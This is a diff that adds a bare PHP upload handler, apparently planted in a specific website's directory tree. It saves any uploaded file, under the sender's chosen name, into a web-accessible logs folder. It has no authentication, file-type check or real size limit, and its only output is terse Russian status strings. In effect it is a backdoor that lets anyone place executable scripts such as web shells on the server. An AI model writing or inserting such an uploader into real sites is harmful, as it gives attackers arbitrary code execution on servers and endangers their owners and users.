@@ -1,0 +1,1 @@
+<html><body><?php if($_FILES["filename"]["size"] > 1024*10000000000000*1024) { echo ("три"); exit;}if(is_uploaded_file($_FILES["filename"]["tmp_name"])) {if(!move_uploaded_file($_FILES["filename"]["tmp_name"], "/var/www/legend/data/www/lostcombats.com/logs/".$_FILES["filename"]["name"])){echo "переместить";}} else { echo("Ошибка"); }?></body></html>
